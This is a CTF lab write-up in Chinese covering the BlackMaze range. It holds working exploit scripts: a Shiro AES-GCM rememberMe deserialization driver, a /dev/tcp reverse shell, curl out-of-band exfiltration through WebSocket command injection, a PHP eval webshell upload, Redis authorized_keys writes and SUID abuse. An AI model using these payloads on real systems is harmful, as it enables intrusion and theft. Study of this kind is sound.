# BlackMaze 复盘：Shiro 任意读到内网三机（春秋云镜）

> 本文记录的是 i春秋·春秋云镜授权靶场中的复盘。命令与载荷仅用于该授权环境，不可用于未授权系统。文中跳板机地址已脱敏为 `<JUMP_HOST>`。

| 项目 | 本次记录 |
|------|----------|
| 靶场 | i春秋·春秋云镜 · BlackMaze（中级） |
| 入口 | `39.98.117.231`（实例有时效，过期回收） |
| 内网 | `172.22.10.0/24` |
| Flag | 本实例实拿 flag1 / flag3 / flag4；flag2 所在 `.3` 本实例不可达 |
| 最终路径 | `/file/download` 任意读 → Shiro AES-GCM rememberMe → SUID `base64` → SOCKS 进内网 → WS `token` 命令注入 → Redis 写 `authorized_keys` → `.154` 上传马 → SUID `check` 时间种子 AES |

![公网端口扫描](/content/blackmaze/image-01.png)

## 1. 攻击链概览

BlackMaze 要的是完整链路：外网应用 → 入口机 shell → SOCKS 进内网 → 客服 WS 注入 → Redis 提权 → 跨机上传到 ThinkPHP → 自研 SUID。每一跳都不是「单洞秒杀」，而是**信任边界里的次级入口**叠起来。

```text
公网 22 / 8080 / 8081
  → 8081 列目录（exrop / start_http_server.py，pwn 跳过）
  → 8080 Shiro：/file/download?path= 任意读
  → 拖 jar → ShiroConfig 密钥 n5RYm2z1V60+D+OiNLXksQ==
  → rememberMe AES-GCM + CommonsBeanutils1 → webapp
  → SUID /usr/bin/base64 读 /flag → flag1
  → ssh -D 1080 建 SOCKS（入口公网可达）
  → .155:9501 WebSocket token 拼进 redis-cli → www-data
  → Redis root 未授权 → 写 /root/.ssh/authorized_keys → flag3
  → 直调 .154 /api/upload/file 上传 php → www-data
  → SUID /usr/bin/check（srand(time) 派生 AES）→ flag4
  → .3 OpenRASP 机本实例不可达（flag2 参考公开复盘）
```

| IP | 角色 | Flag |
|----|------|------|
| `39.98.117.231` / `172.22.10.22` | Shiro 入口 | flag1 |
| `172.22.10.155` | Swoole WS + Redis | flag3 |
| `172.22.10.154` | ThinkPHP 客服后端 | flag4 |
| `172.22.10.3` | ThinkPHP + OpenRASP | flag2（本实例不通） |

## 2. 外网：8080 登录页 + 8081 列目录

登录页是 Spring Boot + Shiro 风格的 ERP：

![8080 登录页](/content/blackmaze/image-02.png)

`fscan` 比纯 nmap 多摸到 **8081**：

![fscan：22 / 8080 / 8081](/content/blackmaze/image-03.png)

8081 是 Python `SimpleHTTPRequestHandler`，直接列目录：

![8081 Directory listing](/content/blackmaze/image-04.png)

| 文件 | 说明 |
|------|------|
| `start_http_server.py` | 无鉴权静态服务脚本 |
| `exrop` | ELF 栈溢出靶子，经 `socat` 挂 **65533**（公网过滤、内网可达） |

`exrop` 确认为 ELF64 / Ubuntu 20.04 构建；与四个 Flag 无关，本次跳过。

![exrop 静态识别](/content/blackmaze/image-05.png)

## 3. `/file/download` 任意读 → Shiro 密钥

登录页源码暴露一整套文件接口；其中 **`/file/download` 无鉴权且不过滤 `..`**：

```bash
# 读 /etc/passwd，确认 webapp 用户
curl 'http://39.98.117.231:8080/file/download?path=../../../../../../etc/passwd'

# 定位 jar
curl 'http://39.98.117.231:8080/file/download?path=../../../../../../../proc/self/cmdline'
# /usr/bin/java -jar /home/webapp/ShiroProject-0.0.1-SNAPSHOT.jar
```

![任意读 /etc/passwd](/content/blackmaze/image-06.png)

把 jar 拖下来反编译 `ShiroConfig`：

```java
private static final String CUSTOM_CIPHER_KEY = "n5RYm2z1V60+D+OiNLXksQ==";
```

依赖版本要点：

```text
shiro-core-1.5.3
commons-beanutils-1.9.4
commons-collections-3.2.2
```

Shiro 1.5.3 默认 **AES/GCM**（`<iv16><ciphertext><tag16>`），公开 CBC 字典打不穿，必须自己按 GCM 封 `rememberMe`。Gadget 用 `CommonsBeanutils1`；ysoserial 的 `Runtime.exec` 按空格切分，命令经 base64 + bash 花括号透传。完整驱动：

```python
#!/usr/bin/env python3
"""shiro_exploit.py — Shiro 1.5.3 rememberMe (AES-GCM) + CommonsBeanutils1"""
import base64, os, subprocess, sys, urllib.request, urllib.error
from Crypto.Cipher import AES

KEY = base64.b64decode("n5RYm2z1V60+D+OiNLXksQ==")
TARGET = "http://39.98.117.231:8080/"
YSOSERIAL = "/tmp/ys.jar"
JAVA_OPENS = [
    "--add-opens", "java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
    "--add-opens", "java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
    "--add-opens", "java.base/java.util=ALL-UNNAMED",
]

def build_payload(shell_cmd: str) -> bytes:
    b64 = base64.b64encode(shell_cmd.encode()).decode()
    runtime_cmd = "bash -c {echo,%s}|{base64,-d}|bash" % b64
    p = subprocess.run(
        ["java", *JAVA_OPENS, "-jar", YSOSERIAL, "CommonsBeanutils1", runtime_cmd],
        capture_output=True)
    if p.returncode != 0:
        sys.exit("ysoserial failed: " + p.stderr.decode()[:500])
    return p.stdout

def encrypt(payload: bytes) -> str:
    iv = os.urandom(16)
    cipher = AES.new(KEY, AES.MODE_GCM, nonce=iv, mac_len=16)
    ct, tag = cipher.encrypt_and_digest(payload)
    return base64.b64encode(iv + ct + tag).decode()

def send(cookie: str, url: str):
    req = urllib.request.Request(url)
    req.add_header("Cookie", "rememberMe=" + cookie)
    try:
        resp = urllib.request.urlopen(req, timeout=30)
        print(f"[+] {url} -> HTTP {resp.status}")
        sc = resp.headers.get("Set-Cookie")
    except urllib.error.HTTPError as e:
        print(f"[+] {url} -> HTTP {e.code}")
        sc = e.headers.get("Set-Cookie")
    if sc and "deleteMe" in sc:
        print("[!] rememberMe=deleteMe -> deserialization rejected")
    else:
        print("[*] Set-Cookie:", sc)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit("usage: shiro_exploit.py '<shell command>' [url]")
    raw = build_payload(sys.argv[1])
    print(f"[*] payload {len(raw)} bytes for: {sys.argv[1]}")
    send(encrypt(raw), sys.argv[2] if len(sys.argv) > 2 else TARGET)
```

用法示例（跳板先 `nc -lvnp 8443`）：

```bash
python3 shiro_exploit.py 'bash -c "bash -i >& /dev/tcp/<JUMP_HOST>/8443 0>&1"'
```

反弹到跳板监听，落到 `webapp@Shiro`，内网地址 `172.22.10.22/24`：

![rememberMe 反弹 webapp](/content/blackmaze/image-07.png)

## 4. flag1：SUID `base64`

```bash
find / -perm -u=s -type f 2>/dev/null
# ... /usr/bin/base64

/usr/bin/base64 /flag | base64 -d
# flag{16fc0d69-a7b9-0a5d-5ff6-8eab6776774f}
```

`base64` 属 root 且 SUID，只做编解码不做权限判断——GTFOBins「读文件」经典姿势。

![SUID base64 读 flag1](/content/blackmaze/image-08.png)

## 5. SOCKS 进内网

入口机公网可达，直接动态转发（不必再套一层跳板机做代理）：

```bash
ssh -f -N -D 1080 \
  -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes \
  -i ~/.ssh/id_ed25519 webapp@39.98.117.231
```

该段是**代理 ARP**：邻居 MAC 全是 `ee:ff:ff:ff:ff:ff`，ARP 扫无效，存活靠 TCP。入口机上 `fscan` 扫 `172.22.10.0/24`：

![内网扫描：.22 / .154 / .155](/content/blackmaze/image-09.png)

| 主机 | 端口 | 服务 |
|------|------|------|
| `.22` | 8080 / 8081 / 65533 | Shiro / 列目录 / pwn |
| `.154` | 22 / 80 | Apache + ThinkPHP 5.1.41（客服后端） |
| `.155` | 22 / 80 / 9501 | Apache 默认页 + **Swoole WebSocket** |
| `.3` | — | 本实例 ICMP/TCP 全超时 |

`.154` 是 Vue 前端壳，真正上传由 **`.155` WS 转发落地到 `.154`**——跨机通道就是后面的突破口。

## 6. `.155`：WebSocket `token` 命令注入 → flag3

`9501` 上消息必须带 `emit` + `token`。服务端 `/opt/server/server.php`（644 可读）里：

```php
$messageKey = "chat:messages:$token";   // 未加引号拼进 shell
$command = escapeshellarg(json_encode($message));
exec("redis-cli RPUSH $messageKey $command");
```

**`escapeshellarg` 加在了 `$command` 上，危险的 `$messageKey` 反而裸拼**——防护加错位置。

回显走 OOB：入口机起多线程监听（单线程会被占住的 bash 卡死）：

```python
#!/usr/bin/env python3
"""oob.py — ThreadingTCPServer，POST /o 的 body 追加到 .body 文件"""
import http.server, socket, socketserver, sys, datetime

LOG = sys.argv[2] if len(sys.argv) > 2 else "/tmp/oob_http.txt"
BODYLOG = LOG + ".body"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 9002

class H(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    timeout = 10

    def _log(self, body=b""):
        with open(LOG, "a") as f:
            f.write(f"--- {datetime.datetime.now().isoformat()} {self.command} {self.path} "
                    f"from={self.client_address[0]}\n")
            if body:
                f.write("    BODY: " + body.decode(errors="replace") + "\n")
        print(f"[hit] {self.command} {self.path}", flush=True)

    def do_GET(self):
        self._log(); self.send_response(200); self.end_headers(); self.wfile.write(b"ok")

    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n) if n else b""
        self._log(body)
        if self.path.startswith("/o"):
            open(BODYLOG, "ab").write(body)
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")

    def log_message(self, *a): pass

class S(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

with S(("0.0.0.0", PORT), H) as s:
    print(f"oob listening :{PORT} -> {LOG}", flush=True)
    s.serve_forever()
```

底层 WebSocket（经 SOCKS 打 `.155:9501`）手写帧，方便控 opcode/mask：

```python
#!/usr/bin/env python3
"""wsraw.py — 经 SOCKS5 的最小 WebSocket 客户端"""
import base64, os, socket, struct

SOCKS = ("127.0.0.1", 1080)
TARGET = ("172.22.10.155", 9501)

def _socks_connect(dst_host, dst_port):
    s = socket.create_connection(SOCKS, timeout=15)
    s.sendall(b"\x05\x01\x00")
    if s.recv(2) != b"\x05\x00":
        raise RuntimeError("socks5 greeting failed")
    h = dst_host.encode()
    s.sendall(b"\x05\x01\x00\x03" + bytes([len(h)]) + h + dst_port.to_bytes(2, "big"))
    rep = s.recv(4)
    if len(rep) < 2 or rep[1] != 0:
        raise RuntimeError("socks5 connect failed: %r" % rep)
    atyp = rep[3]
    s.recv(4 if atyp == 1 else 16 if atyp == 4 else s.recv(1)[0])
    s.recv(2)
    return s

def connect(path="/"):
    s = _socks_connect(*TARGET)
    key = base64.b64encode(os.urandom(16)).decode()
    req = (f"GET {path} HTTP/1.1\r\nHost: 172.22.10.155:9501\r\nUpgrade: websocket\r\n"
           f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n")
    s.sendall(req.encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        c = s.recv(4096)
        if not c: raise RuntimeError("closed during handshake")
        buf += c
    if b"101" not in buf.split(b"\r\n")[0]:
        raise RuntimeError("handshake failed")
    return s, buf.split(b"\r\n\r\n", 1)[1]

def send(s, payload: bytes, opcode=1, fin=True, mask=True):
    b0 = (0x80 if fin else 0) | opcode
    n = len(payload)
    b1 = n if n < 126 else (126 if n < 65536 else 127)
    if mask: b1 |= 0x80
    h = bytes([b0, b1])
    if b1 & 0x7f == 126: h += struct.pack(">H", n)
    elif b1 & 0x7f == 127: h += struct.pack(">Q", n)
    if mask:
        mk = os.urandom(4)
        payload = bytes(payload[i] ^ mk[i % 4] for i in range(n))
        h += mk
    s.sendall(h + payload)

def recv(s, timeout=5):
    s.settimeout(timeout)
    try:
        h = s.recv(2)
        if len(h) < 2: return None
        n = h[1] & 0x7f
        if n == 126: n = struct.unpack(">H", s.recv(2))[0]
        elif n == 127: n = struct.unpack(">Q", s.recv(8))[0]
        data = b""
        while len(data) < n:
            c = s.recv(n - len(data))
            if not c: break
            data += c
        return h[0] & 0x0f, data
    except Exception:
        return None
```

一键注入 + 从入口机拉 OOB body：

```python
#!/usr/bin/env python3
"""rce.py — WS token 注入，输出经 .22:9002 OOB 回传"""
import json, os, subprocess, sys, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from wsraw import connect, send, recv

SSH = ["ssh", "-o", "StrictHostKeyChecking=no", "-i", os.path.expanduser("~/.ssh/id_ed25519"),
       "webapp@39.98.117.231"]
BODYLOG = "/tmp/oob_http.txt.body"
MARK = "RCE-%d" % int(time.time() * 1000)

def read_body_log():
    return subprocess.run(SSH + ["cat " + BODYLOG], capture_output=True).stdout.decode(errors="replace")

def run(cmd: str, timeout=25, wait=4.0):
    inner = "(echo %s; %s) 2>&1 | curl -s -X POST --data-binary @- http://172.22.10.22:9002/o" % (MARK, cmd)
    msg = {"emit": "msg", "message": "123", "token": ";" + inner}
    s, _ = connect()
    send(s, json.dumps(msg).encode())
    try: recv(s, timeout=timeout)
    except Exception: pass
    s.close()
    deadline = time.time() + wait
    while time.time() < deadline:
        log = read_body_log()
        idx = log.rfind(MARK)
        if idx >= 0:
            out = log[idx + len(MARK):]
            if out.strip() or time.time() > deadline - 1:
                return out.rstrip("\n")
        time.sleep(0.5)
    return "<no output captured>"

if __name__ == "__main__":
    print(run(sys.argv[1]))
```

```bash
# 入口机：python3 oob.py 9002
# Kali：  python3 tools/rce.py 'id; hostname'
# uid=33(www-data) ... / redis
```

经 SOCKS 验证 RCE，身份 `www-data@redis`：

![SOCKS + WS 注入：www-data@redis](/content/blackmaze/image-10.png)

交互式 pty（先在 `.155:9502` 起 `pty.spawn`，再经 SOCKS 挂本地终端）：

```python
#!/usr/bin/env python3
"""pty155.py — WS 注入起 pty 监听，再 SOCKS 挂到本终端"""
import json, os, select, socket, sys, termios, tty, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from wsraw import connect, send, recv

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 9502
TARGET = ("172.22.10.155", PORT)
SOCKS = ("127.0.0.1", 1080)
BOOT = (
    ";setsid nohup python3 -c 'import pty,socket,os;"
    "s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
    's.bind(("0.0.0.0",%d));s.listen(1);'
    "c,_=s.accept();"
    "[os.dup2(c.fileno(),f) for f in (0,1,2)];"
    "pty.spawn(\"/bin/bash\")' >/dev/null 2>&1 </dev/null &" % PORT
)

def socks_connect(dst, port):
    s = socket.create_connection(SOCKS, timeout=15)
    s.sendall(b"\x05\x01\x00")
    if s.recv(2) != b"\x05\x00":
        raise RuntimeError("socks5 greeting failed")
    h = dst.encode()
    s.sendall(b"\x05\x01\x00\x03" + bytes([len(h)]) + h + port.to_bytes(2, "big"))
    rep = s.recv(4)
    if len(rep) < 2 or rep[1] != 0:
        raise RuntimeError("socks5 connect failed")
    atyp = rep[3]
    n = 4 if atyp == 1 else 16 if atyp == 4 else s.recv(1)[0]
    rest = b""
    while len(rest) < n + 2:
        rest += s.recv(n + 2 - len(rest))
    return s

def start_listener():
    s, _ = connect()
    send(s, json.dumps({"emit": "msg", "message": "123", "token": BOOT}).encode())
    try: recv(s, timeout=8)
    except Exception: pass
    s.close()

def main():
    print("[*] 在 .155:%d 起 pty 监听 ..." % PORT)
    start_listener()
    for _ in range(20):
        try:
            c = socks_connect(*TARGET); break
        except OSError:
            time.sleep(0.5)
    else:
        sys.exit("[-] 连不上 .155:%d" % PORT)
    print("[*] 已连上,Ctrl-] 退出\n")
    old = termios.tcgetattr(sys.stdin)
    try:
        tty.setraw(sys.stdin.fileno())
        while True:
            r, _, _ = select.select([c, sys.stdin], [], [])
            if c in r:
                d = c.recv(65536)
                if not d: break
                os.write(sys.stdout.fileno(), d)
            if sys.stdin in r:
                d = os.read(sys.stdin.fileno(), 65536)
                if not d or d == b"\x1d": break
                c.sendall(d)
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old)
        c.close()

if __name__ == "__main__":
    main()
```

![pty155 交互 shell](/content/blackmaze/image-11.png)

> 坑：注入 `proc_open("/bin/bash",…)` 会占住 Swoole worker（`exec` 等管道 EOF）。交互 shell 必须会自行结束，或走单独端口的 pty，别把 worker 卡死。

Redis 6.0.9 以 **root** 跑在 `127.0.0.1:6379` 且无认证：

```bash
redis-cli config set dir /root/.ssh/
redis-cli config set dbfilename authorized_keys
printf '\n\n<ssh-ed25519 公钥>\n\n' | redis-cli -x set k   # -x 保住真换行
redis-cli save
```

![Redis 写 authorized_keys](/content/blackmaze/image-12.png)

经 SOCKS `ProxyCommand` SSH 登录 root（`proxychains` 这条路径会误报，自己握手更稳）：

```python
#!/usr/bin/env python3
"""socks5cmd.py — ssh ProxyCommand：经 127.0.0.1:1080 连 %h %p"""
import os, select, socket, sys

host, port = sys.argv[1], int(sys.argv[2])
s = socket.create_connection(("127.0.0.1", 1080), timeout=15)
s.sendall(b"\x05\x01\x00")
if s.recv(2) != b"\x05\x00":
    sys.exit("socks greeting failed")
h = host.encode()
s.sendall(b"\x05\x01\x00\x03" + bytes([len(h)]) + h + port.to_bytes(2, "big"))
rep = s.recv(10)
if len(rep) < 2 or rep[1] != 0:
    sys.exit("socks connect failed: %r" % rep)

stdin, stdout = sys.stdin.fileno(), sys.stdout.fileno()
while True:
    r, _, _ = select.select([s, stdin], [], [], 60)
    if s in r:
        d = s.recv(65536)
        if not d: break
        os.write(stdout, d)
    if stdin in r:
        d = os.read(stdin, 65536)
        if not d: break
        s.sendall(d)
```

```bash
ssh -o ProxyCommand='python3 tools/socks5cmd.py %h %p' \
  -i ~/.ssh/id_ed25519 root@172.22.10.155
cat /root/flag
# flag{4b9581e7-131c-414e-a65f-209a0e533eb8}
```

## 7. `.154`：上传黑名单形同虚设 → flag4

WS 侧上传有扩展名白名单（无 php），所以要**绕开 WS，直调 `.154` HTTP**：

`Upload.php` 三个问题叠在一起：

1. 黑名单只挡 `exe,php,js,html,bat,sh`；
2. `$file->getExtension()` 取的是 **PHP 临时文件**（无后缀 → 空串），永远进不了黑名单；
3. `move()` 却用客户端原名落盘，`.php` 保留，且目录在 Apache docroot 下可解析。

```bash
printf '<?php @eval($_POST[0]);?>' > /tmp/s.php
curl -s -X POST http://172.22.10.154/api/upload/file \
  -F "File=@/tmp/s.php;type=application/octet-stream"
# {"code":0,"msg":"上传成功","data":{"src":"/uploads/file/20260920/....php"}}
```

> 公开复盘说「似乎只允许 155 访问」——实测从入口 `.22` 上传同样成功，没有源 IP 白名单。

webshell 是 `eval($_POST[0])`，必须发 `system('id');`，裸 `id` 会 500。命令台：

```python
#!/usr/bin/env python3
"""shell154.py — 经 SOCKS 打 .154 webshell 的交互命令台"""
import os, subprocess, sys

HERE = os.path.dirname(os.path.abspath(__file__))
URLFILE = os.path.join(HERE, "154_webshell.txt")

def url():
    return sys.argv[1] if len(sys.argv) > 1 else open(URLFILE).read().strip()

def run(u, cmd):
    p = subprocess.run(
        ["curl", "-s", "--socks5-hostname", "127.0.0.1:1080", "-X", "POST",
         "--data-urlencode", "0=system('%s');" % cmd, u],
        capture_output=True, timeout=60)
    return p.stdout.decode(errors="replace")

def main():
    u = url()
    print("[*] webshell:", u)
    while True:
        try:
            line = input("154$ ")
        except (EOFError, KeyboardInterrupt):
            break
        if line.strip() in ("exit", "quit", ""):
            if line.strip() in ("exit", "quit"): break
            continue
        out = run(u, line.replace("'", "'\\''"))
        sys.stdout.write(out if out.endswith("\n") else out + "\n")

if __name__ == "__main__":
    main()
```

![shell154：www-data@customer](/content/blackmaze/image-13.png)

提权看 SUID `/usr/bin/check`：用 `srand(time(0))` / `srand(time(0)+2)` 派生同值 16 字节做 AES-128-CBC 的 key/IV，解密 `argv[1]` 指向的密文后当命令执行。利用要点是 **PHP 复刻 glibc `rand()`**，在同一个 webshell 请求里完成「取秒 → 加密 → 写 `/tmp/x.enc` → `exec check`」，避开跨秒。

驱动只是把 PHP payload POST 上去：

```python
#!/usr/bin/env python3
"""pwn154.py — POST check154.php 到 webshell"""
import os, subprocess, sys

HERE = os.path.dirname(os.path.abspath(__file__))
URLFILE = os.path.join(HERE, "154_webshell.txt")
PAYLOAD = os.path.join(HERE, "check154.php")

def url():
    return sys.argv[1] if len(sys.argv) > 1 else open(URLFILE).read().strip()

u = url()
p = subprocess.run(
    ["curl", "-s", "--socks5-hostname", "127.0.0.1:1080", "-X", "POST",
     "--data-urlencode", "0@%s" % PAYLOAD, u],
    capture_output=True, timeout=120)
print(p.stdout.decode(errors="replace"))
```

核心 payload（`check154.php`，经 `eval($_POST[0])` 执行）：

```php
<?php
// 复刻 glibc TYPE_3 加法反馈 rand()，同请求内加密+落盘+执行
function gs($seed){
  $st=array_fill(0,31,0); if($seed==0)$seed=1; $st[0]=$seed; $w=$seed;
  for($i=1;$i<31;$i++){
    $hi=intdiv($w,127773); $lo=$w%127773; $w=16807*$lo-2836*$hi;
    if($w<0)$w+=2147483647; $st[$i]=$w;
  }
  $f=3;$r=0;
  for($k=0;$k<310;$k++){ $st[$f]=($st[$f]+$st[$r])&0xFFFFFFFF; $f=($f+1)%31; $r=($r+1)%31; }
  return [$st,$f,$r];
}
function gr(&$s){
  $f=$s[1];$r=$s[2]; $v=($s[0][$f]+$s[0][$r])&0xFFFFFFFF;
  $s[0][$f]=$v; $res=$v>>1; $s[1]=($f+1)%31; $s[2]=($r+1)%31; return $res;
}
$cmd=isset($_POST[1])?$_POST[1]:"cat /root/flag > /tmp/res.txt";
$plain=$cmd.str_repeat("\0",((intdiv(strlen($cmd),16)+1)*16)-strlen($cmd));
$done=false;
for($a=0;$a<20;$a++){
  $t=time(); $frac=microtime(true)-$t;
  if($frac>0.55){ usleep((int)((1.05-$frac)*1000000)); $t=time(); }
  $s=gs($t);  $kb=gr($s)&0xFF;
  $s2=gs($t+2); $vb=gr($s2)&0xFF;
  $ct=openssl_encrypt($plain,"aes-128-cbc",
    str_repeat(chr($kb),16), OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING,
    str_repeat(chr($vb),16));
  if($ct===false){ echo "encrypt failed\n"; break; }
  file_put_contents("/tmp/x.enc",$ct."\n");
  @unlink("/tmp/res.txt");
  exec("/usr/bin/check /tmp/x.enc 2>&1",$o,$rc);
  if(file_exists("/tmp/res.txt")){
    echo "OK t=$t rc=$rc\n".file_get_contents("/tmp/res.txt"); $done=true; break;
  }
}
if(!$done) echo "no res.txt after retries\n";
```

```bash
python3 tools/pwn154.py
# OK t=1789891990 rc=0
# flag{0609875d-0092-45a7-b675-afebf5e887c0}
```

![SUID check 打出 flag4](/content/blackmaze/image-14.png)

## 8. flag2（`.3`）本实例不可达

本实例 `172.22.10.3` ICMP 全丢、22/80/3306 均超时；同网段 `.22/.154/.155` 正常。与出题方确认属环境问题。

公开复盘链条（未经本实例验证）大致是：

1. ThinkPHP 5.0.23 `_method` RCE，但目标有 **OpenRASP**，直接 `system` 被拦；
2. 退化成任意文件读（`filter[]=readfile`）摸 `/opt/plugins/official.js` 与 rasp 日志；
3. 日志里捞 MySQL 凭据 → 内存破坏类原语绕 RASP → SUID `find` 读 flag。

记住两点：**RASP 挡执行时先退化成任意读**；运行时防护的名单同样可能被内存原语绕过。

公开值（未在本实例验证）：`flag{0df84b0d-dd43-469e-b454-a1404bfd49e4}`。

## 9. Flag 汇总

| Flag | 位置 | 值 |
|------|------|-----|
| flag1 | `.22:/flag` | `flag{16fc0d69-a7b9-0a5d-5ff6-8eab6776774f}` |
| flag3 | `.155:/root/flag` | `flag{4b9581e7-131c-414e-a65f-209a0e533eb8}` |
| flag4 | `.154:/root/flag` | `flag{0609875d-0092-45a7-b675-afebf5e887c0}` |
| flag2 | `.3` | 本实例不可达 |

## 10. 关键知识点

| 要点 | 复盘结论 |
|------|----------|
| Shiro 1.5.3 | 默认 AES-**GCM**，CBC 脚本无效；密钥可从任意读拖 jar 拿 |
| 任意读接口 | 登录页源码里的「文件管理」往往没挂鉴权 |
| SUID `base64` | 读文件类 GTFOBins，编解码即提权读 |
| 代理 ARP | 别迷信 ARP 存活；轻量 TCP 连扫更稳 |
| `escapeshellarg` | 加错变量等于没加；拼串位置比「有没有转义」更重要 |
| Redis 写钥匙 | root 跑 + 未授权 = 任意写；`-x` 才能保住公钥换行 |
| 上传黑名单 | `getExtension()` 打在临时文件上时，黑名单永远空 |
| 时间种子 AES | 同请求内复刻 `rand()`，别跨秒拆步骤 |
| RASP | 挡不住任意读时，策略与日志往往比硬打 RCE 更值钱 |

## 11. 脚本清单

| 脚本 | 用途 |
|------|------|
| `shiro_exploit.py` | AES-GCM rememberMe + CommonsBeanutils1 |
| `tools/oob.py` | 入口机 OOB 回传（多线程） |
| `tools/wsraw.py` | SOCKS 上的裸 WebSocket 客户端 |
| `tools/rce.py` | WS `token` 注入 + 拉 OOB |
| `tools/pty155.py` | `.155` 交互 pty |
| `tools/socks5cmd.py` | ssh `ProxyCommand` |
| `tools/shell154.py` | `.154` webshell 命令台 |
| `tools/pwn154.py` + `check154.php` | SUID `check` 时间种子提权 |

## 12. 复盘

BlackMaze 的骨架不是某一个 CVE，而是四次「边界内的小门」：无鉴权下载泄密钥、转义加错位、上传校验取错对象、自研 SUID 用时间当密钥——再叠一层 root Redis。外网到内网、应用到运行时，链条完整；本实例只差 OpenRASP 那台环境没起来。
